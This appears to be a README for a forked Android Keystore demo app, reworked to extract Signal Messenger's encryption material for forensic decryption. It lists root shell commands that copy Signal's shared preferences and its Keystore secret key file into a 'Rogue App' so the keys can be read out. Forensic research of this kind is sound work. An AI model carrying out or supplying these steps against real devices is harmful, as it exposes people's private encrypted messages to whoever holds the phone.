Clone and Edit for Signal Messenger from here.
https://github.com/sauravpradhan/AndroidKeyStore

This storage is used to decrypt Signal messenger, more information can be found here.
https://github.com/esby97/Messenger-Forensics

Usage for MY Application is as below.

# 1. copy SharedPreferences to Rogue App.
```
cd /data/data/com.android.keystore.androidkeystoredemo
mkdir shared_prefs
cd shared_prefs/
cp /data/data/org.thoughtcrime.securesms/shared_prefs/* ./
chmod 777 -R /data/data/com.android.keystore.androidkeystoredemo/shared_prefs/
```

# 2. copy Android Keystore SecretKey to Rogue App
```
cd /data/misc/keystore/user_0
ls | grep Signal
cp <UID>_USRPKEY_SignalSecret <UID>_USRPKEY_FAKE_SignalSecret
```

# 3. Open the Application and Check the extracted Keys

---

# AndroidKeyStore
Demo app for using Android Keystore System  :metal:

#APK Link
You can directly test the APK from the below link:
https://drive.google.com/file/d/0Byaspar4S5SEb09xbWN3STh3bG8/view?usp=sharing

#Refernces from
https://medium.com/@josiassena/using-the-android-keystore-system-to-store-sensitive-information-3a56175a454b
https://medium.com/@ericfu/securely-storing-secrets-in-an-android-application-501f030ae5a3



